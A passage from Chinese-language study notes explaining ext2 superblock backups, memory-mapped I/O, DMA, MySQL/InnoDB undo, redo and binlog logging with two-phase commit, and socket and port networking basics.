<li>boot loader 加载并运行 <strong>Linux 内核</strong>（最终选手）</li>
</ol>
<h2 id="✅-哪些区域有备份？（ext2-文件系统）">✅ 哪些区域有备份？（ext2 文件系统）</h2>
<p>在 ext2 中，<strong>以下两个核心结构是有备份的</strong>：</p>
<h3 id="1-Super-Block（超级块）备份"><strong>1.Super Block（超级块）备份</strong></h3>
<ul>
<li><strong>主副本</strong>：位于文件系统起始偏移 1024 字节处（通常是第一个块组的第一个块）。</li>
<li><strong>备份副本</strong>：在后续的多个块组中也会存一份，防止超级块损坏导致整个文件系统无法识别。</li>
</ul>
<h3 id="2-Group-Descriptor-Table（组描述符表）备份"><strong>2.Group Descriptor Table（组描述符表）备份</strong></h3>
<ul>
<li>描述所有块组的位置、大小、inode 表等信息。</li>
<li>在和超级块同位置也进行备份。</li>
</ul>
<h2 id="📦-ext2-的备份块组示意图">📦 ext2 的备份块组示意图</h2>
<p>以块大小 1KB 举例，ext2 会在以下块组中保留备份（典型情况）：</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">主超级块：      Block <span class="keyword">Group</span> <span class="title">0</span>` `备份超级块：    Block <span class="keyword">Group</span> <span class="title">1</span>、Block <span class="keyword">Group</span> <span class="title">3</span>、Block <span class="keyword">Group</span> <span class="title">5</span>、Block <span class="keyword">Group</span> <span class="title">7</span>...</span><br></pre></td></tr></table></figure>
<p>这种选择的块组称为 <strong>“备份块组（Backup Block Groups）”</strong>，采用的是类似奇偶算法或<strong>稀疏备份策略（sparse superblock）</strong>。</p>
<blockquote>
<p>如果是稀疏备份的话，有的分区是没有超级块和块组描述的</p>
</blockquote>
<h1>总线和端口</h1>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MjYzYzY4MzI3YmUxNDE3OGEzNTFkYjc1YmUwZWRlZTJfbDJvaEJhZkxab0lobkVNMmhDUGxia3lhT1RxdHcxQ2RfVG9rZW46VVZGRWJobEdnbzNJVUh4em8xTmM4ZERObnljXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="✅-什么是内存映射-I-O（Memory-Mapped-I-O）？">✅ 什么是内存映射 I/O（Memory-Mapped I/O）？</h2>
<p><strong>定义</strong>： 将 I/O 设备的控制寄存器和数据缓冲区的地址<strong>映射到普通内存地址空间</strong>中，CPU 可以通过访问这些内存地址，像访问内存一样对设备进行读写操作。</p>
<h2 id="🧠-为什么要这么做？">🧠 为什么要这么做？</h2>
<ul>
<li>统一访问方式：CPU 不需要使用特殊的 <code>IN</code>/<code>OUT</code> 指令（如 x86 的端口 I/O），直接使用 <code>MOV</code> 指令即可。</li>
<li>简化设计：在总线和指令层面统一“内存”和“I/O 设备”的访问逻辑。</li>
<li>提高性能：编译器、CPU 缓存等机制可以更好地优化内存访问。</li>
</ul>
<h2 id="🧩-举个例子（假设在某个嵌入式系统中）：">🧩 举个例子（假设在某个嵌入式系统中）：</h2>
<ul>
<li>某串口 UART 的数据寄存器地址是 <code>0x10000000</code></li>
<li>CPU 想读取串口输入：</li>
</ul>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">volatile</span> <span class="type">char</span> *uart_data = (<span class="type">char</span> *)<span class="number">0x10000000</span>;` `<span class="type">char</span> ch = *uart_data;  <span class="comment">// 从串口读取一个字节</span></span><br></pre></td></tr></table></figure>
<ul>
<li>想写入数据：</li>
</ul>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*uart_data = <span class="string">&#x27;A&#x27;</span>;  <span class="regexp">//</span> 向串口写入 <span class="string">&#x27;A&#x27;</span></span><br></pre></td></tr></table></figure>
<p>你会发现，CPU 根本不知道这是“设备”，它只是把这个地址当作内存来看。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MzI1YWFlN2U4MWM5NzM0ZTZhMDk3OWMwNmRkMjIwZDRfdW1IYnFuNnYwTmI4TUwxYWRKbHhxVzlTWk5jOFpGQjBfVG9rZW46UTVKd2JDbnN3b29LcXd4Nm5UN2MySUQ4bjRjXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h1>DMA</h1>
<h3 id="❌-没有-DMA-时的数据搬运流程（程序式-I-O）：">❌ 没有 DMA 时的数据搬运流程（程序式 I/O）：</h3>
<ol>
<li><strong>CPU 轮询 I/O 设备状态</strong>：
<ol>
<li>CPU 不断检查硬盘控制器状态寄存器，看数据是否准备好。</li>
<li>这种方式叫“<strong>轮询（Polling）</strong>”，消耗大量 CPU 时间。</li>
</ol>
</li>
<li><strong>数据准备好后</strong>：
<ol>
<li>CPU 读取一个字节/字（比如 1B 或 2B）到寄存器；</li>
<li>然后将寄存器的值写入内存；</li>
<li>重复上述过程直到数据全部读完。</li>
</ol>
</li>
</ol>
<h3 id="❗-会发生什么？">❗ 会发生什么？</h3>
<ul>
<li><strong>CPU 陷入“搬运工”角色</strong>，无法处理其他任务；</li>
<li>对于大数据量（如 1MB 文件），CPU 需要循环执行上百万次<strong>读-写操作</strong>；</li>
<li>CPU 与 I/O 控制器之间频繁交互，总线压力大，缓存无用武之地；</li>
<li><strong>完全浪费了 CPU 的运算能力</strong>，系统响应慢，吞吐低。</li>
</ul>
<blockquote>
<p>没有 DMA 时，CPU 要像苦力一样反复查询硬盘状态、读出数据、写入内存，处理大数据时效率极低，完全浪费高性能 CPU 的能力。</p>
</blockquote>
<h3 id="🚧-2-传统数据传输方式的局限">🚧 <strong>2. 传统数据传输方式的局限</strong></h3>
<h4 id="✅-中断方式：">✅ 中断方式：</h4>
<ul>
<li>每当外设有数据要处理（如键盘按下一个键），就<strong>触发一次中断</strong>；</li>
<li>CPU 响应中断，读取数据并搬到内存；</li>
<li>适用于<strong>低频率、小数据量</strong>的场景；</li>
<li>缺点：<strong>中断频繁时上下文切换开销大</strong>。</li>
</ul>
<h4 id="⚠️-程序式-I-O（Programmed-I-O）：">⚠️ 程序式 I/O（Programmed I/O）：</h4>
<ul>
<li>CPU 全程控制每一个数据字节的读写，繁杂且低效；</li>
<li>若要从硬盘读取 1MB 数据，需发出百万次 I/O 指令；</li>
<li>称为“<strong>程序式 I/O 的陷阱</strong>”——CPU 没法做别的事，全被 I/O 拖住。</li>
</ul>
<h3 id="🔄-3-DMA-的工作原理">🔄 <strong>3. DMA 的工作原理</strong></h3>
<h4 id="🧾-DMA-的定义：">🧾 DMA 的定义：</h4>
<p><strong>DMA 是一种专用的硬件控制器</strong>，能在内存与 I/O 设备之间直接传输数据，<strong>CPU 不需逐字节干预</strong>。</p>
<h4 id="📦-数据传输流程：">📦 数据传输流程：</h4>
<ol>
<li><strong>CPU 初始化 DMA</strong>：
<ol>
<li>设置源地址（如：硬盘某扇区）；</li>
<li>设置目标地址（如：内存某块区域）；</li>
<li>指定传输长度；</li>
</ol>
</li>
<li><strong>DMA 控制器接管数据传输</strong>：
<ol>
<li>占用总线，直接在 I/O 与内存之间搬运数据；</li>
</ol>
</li>
<li><strong>传输完成后通知 CPU</strong>：
<ol>
<li>DMA 发送一次中断，CPU 再进行后续处理，如解析数据或更新状态。</li>
</ol>
</li>
</ol>
<h4 id="💬-对比中断方式：">💬 对比中断方式：</h4>
<ul>
<li>中断方式是“数据来了叫我(CPU)”；</li>
<li>DMA 是“我(CPU)告诉你去哪搬，搬完你再叫我”。</li>
</ul>
<h3 id="🔌-4-总线占用问题">🔌 <strong>4. 总线占用问题</strong></h3>
<ul>
<li>DMA 传输数据时会占用内存总线；</li>
<li>此时 CPU 无法访问内存，但仍可使用内部缓存（L1/L2/L3）继续执行指令；</li>
<li>现代系统调度精巧，总线占用时间极短，不会造成明显性能瓶颈；</li>
<li>体现了<strong>总线分时、多级缓存</strong>等并行优化技术。</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmU2OGUyM2QyYTlmMDUxOTMyNWMwYjM2OTU2M2RmNmJfaHRZQ1ZoRXc3UHUxN0FlSDJPVE5OS2d4SU1GeXduUFRfVG9rZW46VjRMemJoVjlJb3I1YVl4R3dwbmNUSndDbmJkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmMyYmU4ZWFlNWVlZGQyMTE3OTNmNDQwYTRjNDdiYmRfOGdZNW4yM2dyem5mOW1kNkRaVW9hSEVONkMwcUhKMW9fVG9rZW46U1JKZ2J6M2FMb2VraGV4VkxERGNuWHN5bjZiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h1>Undo日志和Redo日志</h1>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YTBjMWMxN2QyNzA1ZTM2OTQ4ZmU4MzVhZmMwZmI0YTBfR0tGVlVKY056V3d0ekNGT1llZ1BqTTJsV05UU2lnU1NfVG9rZW46SGg0U2J4TWtJb3JZSzF4NVJ1R2NNWjY3bkNkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<table>
<thead>
<tr>
<th>对比项</th>
<th>Undo 日志</th>
<th>Redo 日志</th>
</tr>
</thead>
<tbody>
<tr>
<td>用于什么</td>
<td>回滚、构造旧版本（MVCC）</td>
<td>崩溃恢复、重做提交操作</td>
</tr>
<tr>
<td>记录内容</td>
<td>修改前的数据</td>
<td>修改后的数据或操作</td>
</tr>
<tr>
<td>写入时机</td>
<td>事务执行时写入</td>
<td>修改数据页前写入（WAL）</td>
</tr>
<tr>
<td>生效时机</td>
<td>回滚/读取旧版本时使用</td>
<td>崩溃恢复时使用</td>
</tr>
<tr>
<td>保证</td>
<td>原子性、隔离性</td>
<td>持久性（Durability）</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>对比项</th>
<th>Undo 日志</th>
<th>Redo 日志</th>
</tr>
</thead>
<tbody>
<tr>
<td>功能</td>
<td>回滚数据</td>
<td>恢复数据</td>
</tr>
<tr>
<td>记录内容</td>
<td>数据修改前的旧值</td>
<td>数据修改后的新值</td>
</tr>
<tr>
<td>用途</td>
<td>事务回滚、MVCC</td>
<td>崩溃恢复（crash recovery）</td>
</tr>
<tr>
<td>写入时机</td>
<td>执行 DML 语句时</td>
<td>提交时或刷盘时</td>
</tr>
</tbody>
</table>
<h2 id="Undo日志应用场景">Undo日志应用场景</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDNlYTY0MDA1Zjg1MDdhZDJjYTE3NTcyZjVhM2I4NmNfWVNYbkVZT3VlcDRpeHNaN1hEUkNHNU8ybWhKaFVTaEtfVG9rZW46RElwaWJyM214bzFhSTh4WG9kSmNEdEpPbkVlXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h3 id="🧠-每步解析：">🧠 每步解析：</h3>
<ol>
<li>启动事务：
<ol>
<li>InnoDB 开始事务，记录变更。</li>
</ol>
</li>
<li>执行第一条更新：</li>
</ol>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE account SET balance <span class="operator">=</span> balance - <span class="number">100</span> WHERE id <span class="operator">=</span> <span class="number">1</span><span class="comment">;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>修改前：<code>balance = 1000</code>；</li>
<li>修改后：<code>balance = 900</code>；</li>
<li><strong>Undo 日志记录</strong>：<code>id = 1, old_balance = 1000</code>；</li>
</ul>
<ol>
<li>执行第二条更新：</li>
</ol>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> account <span class="keyword">SET</span> balance = balance + <span class="number">100</span> <span class="keyword">WHERE</span> id = <span class="number">2</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>修改前：<code>balance = 500</code>；</li>
<li>修改后：<code>balance = 600</code>；</li>
<li><strong>Undo 日志记录</strong>：<code>id = 2, old_balance = 500</code>；</li>
</ul>
<ol>
<li>执行 ROLLBACK：
<ol>
<li>数据库自动使用 Undo 日志：
<ul>
<li>将 id=1 的 balance 恢复为 1000；</li>
<li>将 id=2 的 balance 恢复为 500；</li>
</ul>
</li>
<li>最终数据库状态与事务开始前一致。</li>
</ol>
</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=Yzc1NzU5NzczNWQzNzA4MmI3ZDgzMDdkNWVlYWI1Yjlfbko5Rk45WVRMZHpxS2JPdk1zRnRmdGF2MjlJdnR0S3hfVG9rZW46Q1ZFb2JYV0s2b3drV2J4MUM4c2NuYVRubjNiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h3 id="🧠-每步解析：-2">🧠 每步解析：</h3>
<ol>
<li>T1 启动事务，修改 price：
<ol>
<li>修改前：price = 80；</li>
<li>修改后：price = 100；</li>
<li><strong>Undo 日志记录</strong>：<code>id = 10, old_price = 80</code>；</li>
<li>注意：T1 还未提交。</li>
</ol>
</li>
<li>T2 启动事务，要求 <strong>可重复读</strong>（REPEATABLE READ）：
<ol>
<li>数据库根据 T2 的快照版本发现：T1 的修改是未提交的；</li>
<li>此时 T2 通过 <strong>undo 日志构造出旧版本</strong>：price = 80；</li>
</ol>
</li>
<li>即使 T1 后来提交，T2 在当前事务中依然看到的是 <code>price = 80</code>（事务隔离）。</li>
</ol>
<h3 id="✅-最终-T2-查询结果：">✅ 最终 T2 查询结果：</h3>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> price <span class="keyword">FROM</span> product <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">10</span>;` `<span class="comment">-- 结果：80（不是 100）</span></span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NjRhZGE2ZjVhYzkzOGNmZmQ5ZGI2NDc4MWZiOWM3ODhfSU11dXFNemV2Y1hBdGF4S1BHQ293ZUFjT1JMN0lZWDJfVG9rZW46VVVidGJqdFdRb2FENVZ4VlF3OWM2UHFublBnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="Redo日志应用场景">Redo日志应用场景</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MTljNmFiYTdjOTcyMTA5MmRiMmNiOWQ3ZGYwM2U0MTZfV3JkdXNiWnpSOHlJc2hpTktmYVJRNXd6cTNyc29pMDZfVG9rZW46Sm9xa2JDcGJpb0Y1Mkp4eXg2UWNGRFBTbkpiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MmQxOWY5YmQzOGI3YzcwMTY1YzUyMDExYzU5NDcxY2RfQ3VLRnpJZ3NodExIa3UwV1BEZ3I4MFpySzJQYmdNTVVfVG9rZW46SmFJUGI5ODJub2lpcUl4ZjhaemNmSkFKbmdmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="Undo-log、Redo-log、Binlog">Undo log、Redo log、Binlog</h2>
<p>这三个日志（Redo Log、Undo Log、Binlog）是理解 MySQL/InnoDB 核心机制的关键</p>
<h2 id="✅-场景示例：A-向-B-转账-100-元">✅ 场景示例：A 向 B 转账 100 元</h2>
<p>假设有这样一个 SQL：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> account <span class="keyword">SET</span> balance = balance - <span class="number">100</span> <span class="keyword">WHERE</span> id = <span class="number">1</span>;` `<span class="keyword">UPDATE</span> account <span class="keyword">SET</span> balance = balance + <span class="number">100</span> <span class="keyword">WHERE</span> id = <span class="number">2</span>;</span><br></pre></td></tr></table></figure>
<p>现在我们依次看看这个过程中每种日志都做了什么。</p>
<h2 id="🧩-一、Redo-Log（重做日志）">🧩 一、Redo Log（重做日志）</h2>
<h3 id="💡-作用">💡 作用</h3>
<ul>
<li><strong>保障崩溃恢复（Crash Recovery）</strong></li>
<li>保证已提交事务的持久性（事务的 D，即 Durability）</li>
</ul>
<h3 id="🕰️-写入时机">🕰️ 写入时机</h3>
<ul>
<li><strong>在修改内存页（Buffer Pool）之后、提交之前</strong></li>
<li>提交事务前必须先将对应的 Redo Log 持久化</li>
</ul>
<h3 id="📦-内容形式">📦 内容形式</h3>
<ul>
<li><strong>物理日志（页级别变更）</strong>
<ul>
<li>比如：页 1234 的第 56 字节从 0x3E8 变成了 0x384</li>
</ul>
</li>
</ul>
<h3 id="🧠-示例">🧠 示例</h3>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">修改了页 1234 的偏移量 80，从 <span class="attribute">balance</span>=1000 改为 900，记录这段变化</span><br></pre></td></tr></table></figure>
<h3 id="🗂️-储存位置">🗂️ 储存位置</h3>
<ul>
<li><strong>InnoDB 引擎层</strong></li>
<li>写入磁盘的 <strong>ib_logfile0/1</strong> 等文件中</li>
</ul>
<h2 id="🧩-二、Undo-Log（回滚日志）">🧩 二、Undo Log（回滚日志）</h2>
<h3 id="💡-作用-2">💡 作用</h3>
<ul>
<li>支持事务回滚</li>
<li>支持 MVCC（多版本并发控制）中的旧版本读取（快照读）</li>
</ul>
<h3 id="🕰️-写入时机-2">🕰️ 写入时机</h3>
<ul>
<li><strong>在数据修改之前就要生成 Undo Log</strong></li>
</ul>
<h3 id="📦-内容形式-2">📦 内容形式</h3>
<ul>
<li>记录“修改前的旧值”，便于回滚恢复</li>
</ul>
<h3 id="🧠-示例-2">🧠 示例</h3>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE account <span class="built_in">SET</span> balance = balance - <span class="number">100</span> <span class="keyword">WHERE</span> id = <span class="number">1</span>; <span class="string">``</span>Undo <span class="keyword">Log</span> 内容： <span class="string">``</span>原始记录 balance = <span class="number">1000</span>，可以用于回滚恢复</span><br></pre></td></tr></table></figure>
<h3 id="🗂️-储存位置-2">🗂️ 储存位置</h3>
<ul>
<li><strong>InnoDB 表空间中隐藏表</strong>（事务内部使用，不直接暴露）</li>
</ul>
<h2 id="🧩-三、Binlog（二进制日志）">🧩 三、Binlog（二进制日志）</h2>
<h3 id="💡-作用-3">💡 作用</h3>
<ul>
<li>主从复制的基础</li>
<li>数据恢复（可以用 Binlog 做 point-in-time recovery）</li>
<li>Canal/DTS 等中间件订阅</li>
</ul>
<h3 id="🕰️-写入时机-3">🕰️ 写入时机</h3>
<ul>
<li><strong>Redo Log prepare 后，提交 Redo Log 之前</strong></li>
</ul>
<p>👉 这是二阶段提交的核心，先写 Redo（prepare 状态）→ 写 Binlog → Redo commit</p>
<h3 id="📦-内容形式（取决于-binlog-format）：">📦 内容形式（取决于 binlog_format）：</h3>
<h3 id="🧠-示例（ROW-格式）：">🧠 示例（ROW 格式）：</h3>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">before: account(<span class="attribute">id</span>=1, <span class="attribute">balance</span>=1000) ``after:  account(<span class="attribute">id</span>=1, <span class="attribute">balance</span>=900)</span><br></pre></td></tr></table></figure>
<h3 id="🗂️-储存位置-3">🗂️ 储存位置</h3>
<ul>
<li><strong>MySQL Server 层</strong></li>
<li>磁盘的 binlog.xxxxxx 文件</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjA5MzYxNGI0OWY3ZTc4ZmQwNTM2ZGRjM2E2Yjc0YWZfNUl4ZnB6Y0Y3dDB3SlMxR05YNUJyeW90eVdOR3RuV3BfVG9rZW46SFZTWWJOeUQwb1F0Wll4cG9nTGNxN3NFbjVlXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="✅-例子：A-转账-100-元给-B">✅ 例子：A 转账 100 元给 B</h2>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BEGIN;<span class="string">` `</span>UPDATE account <span class="built_in">SET</span> balance = balance - <span class="number">100</span> <span class="keyword">WHERE</span> id = <span class="number">1</span>; -- A <span class="string">``</span>UPDATE account <span class="built_in">SET</span> balance = balance + <span class="number">100</span> <span class="keyword">WHERE</span> id = <span class="number">2</span>; -- B <span class="string">``</span>COMMIT;</span><br></pre></td></tr></table></figure>
<h2 id="🧠-背后到底发生了什么？">🧠 背后到底发生了什么？</h2>
<blockquote>
<p>👉 操作涉及到的 <strong>三大日志</strong>：<code>Undo Log</code>、<code>Redo Log</code>、<code>Binlog</code></p>
</blockquote>
<p>我们按时间线来讲：</p>
<h3 id="⏱️-1-事务开始（BEGIN）">⏱️ 1. 事务开始（<code>BEGIN</code>）</h3>
<ul>
<li>MySQL/InnoDB 开始一个事务，开启事务上下文。</li>
</ul>
<h3 id="⏱️-2-更新数据时（执行-UPDATE）">⏱️ 2. 更新数据时（执行 <code>UPDATE</code>）</h3>
<p>🔹 <strong>步骤 1：生成 Undo Log</strong></p>
<ul>
<li>每条 SQL 修改前，都会先<strong>记录旧值</strong>到 Undo Log，以备失败时回滚。</li>
<li>比如：</li>
<li><code>id=1，旧 balance=1000（Undo） ``id=2，旧 balance=2000（Undo）</code></li>
</ul>
<p>🔹 <strong>步骤 2：修改内存中的数据页（Buffer Pool）</strong></p>
<ul>
<li>InnoDB 先把数据页加载进内存，然后修改 <code>balance</code> 字段。</li>
</ul>
<p>🔹 <strong>步骤 3：生成 Redo Log（记录页级变更）</strong></p>
<ul>
<li>记录这些数据页的“修改位置 + 修改内容”</li>
<li>比如：</li>
<li><code>page 123 offset 48 from 1000 → 900</code></li>
</ul>
<p>🧠 此时，数据虽然改了，但<strong>事务还没提交</strong>，只是改了内存页并生成日志。</p>
<h3 id="⏱️-3-提交事务时（COMMIT）">⏱️ 3. 提交事务时（<code>COMMIT</code>）</h3>
<p>这一步非常关键，涉及 <strong>两阶段提交（2PC）</strong>：</p>
<h4 id="🔹-第一步：prepare-Redo-Log（写入-WAL-Buffer，标记为-prepare）">🔹 第一步：<strong>prepare Redo Log</strong>（写入 WAL Buffer，标记为 <code>prepare</code>）</h4>
<ul>
<li>表示事务准备好提交，但还没真正提交</li>
</ul>
<h4 id="🔹-第二步：写入-Binlog">🔹 第二步：<strong>写入 Binlog</strong></h4>
<ul>
<li>Binlog 属于 <strong>Server 层</strong>，记录本次事务的变更操作</li>
<li>如果是 ROW 模式：</li>
<li><code>id=1, balance: 1000 -&gt; 900 ``id=2, balance: 2000 -&gt; 2100</code></li>
</ul>
<h4 id="🔹-第三步：commit-Redo-Log">🔹 第三步：<strong>commit Redo Log</strong></h4>
<ul>
<li>Redo Log 被标记为 <code>commit</code>，事务正式提交</li>
<li>数据才真正持久化！</li>
</ul>
<p>🔒 这一步后，事务才算成功完成。</p>
<h1>Socket</h1>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NTQ2YjJhNzdiNDYyNzQ4NTBiYzRhMmY5MmRiNWEzNDlfcUZsOVRHTGIxdEJEMjlGSERQWjNJeEVrZWM5VkdwUzhfVG9rZW46QXM0SmI1Y3dZb3dSY2d4Q2g0b2NKbDd3bkVlXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDE5Yzg0MjNlZjY0ZmJiMTU2ODdkMDczOTA5MDhkOWNfR0JIQWRFbGNPSGdYeVI1RDJNTGloWWk3eDJiMm5YajdfVG9rZW46WmdnQWIyTVE5b3Y4WkF4QW9TNWNPNzI1bjBlXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjAyYjEyYmJhNDExMzFiNjFmMjJkNDAwNmJjYjA2MGNfU0s2MkpPWXdPcThPcTBwdWFuNklEcHI2QVN5SlBxNXFfVG9rZW46S2tVdGJDaVlSb1NseFN4b2o5aWNjdUUzblBoXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="🔹-网络层：IP（Internet-Protocol）">🔹 网络层：IP（Internet Protocol）</h2>
<ul>
<li>IP 层负责不同主机之间的<strong>数据包路由与传输</strong>；</li>
<li>不区分上层是 TCP 还是 UDP；</li>
<li>提供的是<strong>无连接、尽力而为</strong>的服务。</li>
</ul>
<h2 id="🔁-数据发送流程总结（从上往下）：">🔁 数据发送流程总结（从上往下）：</h2>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户进程 <span class="string">``</span>   ↓ 调用 <span class="keyword">socket</span>、<span class="keyword">send</span> 等系统调用 <span class="string">``</span>Socket 抽象层 <span class="string">``</span>   ↓ 封装成 TCP 或 UDP 报文段 <span class="string">``</span>TCP / UDP <span class="string">``</span>   ↓ 加上 IP 头，交由网络层 <span class="string">``</span>IP 层 <span class="string">``</span>   ↓ 查找路由并发送数据包</span><br></pre></td></tr></table></figure>
<h2 id="🔁-数据接收流程（从下往上）：">🔁 数据接收流程（从下往上）：</h2>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">网络接收数据包（IP） ``   ↓ ``检查上层协议 → TCP / UDP 解封装 ``   ↓` `Socket 层查找对应端口，将数据交给应用进程</span><br></pre></td></tr></table></figure>
<h2 id="✅-总结关键点：">✅ 总结关键点：</h2>
<ul>
<li>Socket 是<strong>通信编程的桥梁</strong>；</li>
<li>TCP/UDP 是传输层协议，各有特点；</li>
<li>IP 负责底层路由传输；</li>
<li>用户进程通过 Socket 抽象使用网络通信，无需处理底层细节。</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MzkxMjU3MDUxMWYzMmU3Y2RkZTMwYjM3ZWUxNjgxY2ZfY0FjNUtidHZCbGpCczZEU3hoUFRQQUJaRnM1UVoyNUVfVG9rZW46S0wxWWIyRktzbzNwd254R1B6Y2NNYWZublBoXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h3 id="以下是不能用进程号（PID）而必须用端口号区分通信进程的核心原因：">以下是不能用进程号（PID）而必须用端口号区分通信进程的核心原因：</h3>
<h3 id="✅-1-PID-是本地唯一，端口号是通信识别关键">✅ 1. <strong>PID 是本地唯一，端口号是通信识别关键</strong></h3>
<ul>
<li><strong>进程号（PID）</strong> 只在本地操作系统中唯一，<strong>操作系统之外的其他主机无法感知它</strong>。</li>
<li>而网络通信是跨主机的，必须用所有主机都能识别的方式来标识“谁是谁”。</li>
<li><strong>端口号是 TCP/IP 协议的一部分</strong>，它会出现在 IP 报文头部，是远程主机可识别的标志。</li>
</ul>
<h3 id="✅-2-网络协议栈根本不关心-PID，只看端口号">✅ 2. <strong>网络协议栈根本不关心 PID，只看端口号</strong></h3>
<ul>
<li>当数据包从网卡进入操作系统，<strong>内核协议栈只看端口号来决定交给哪个进程</strong>。</li>
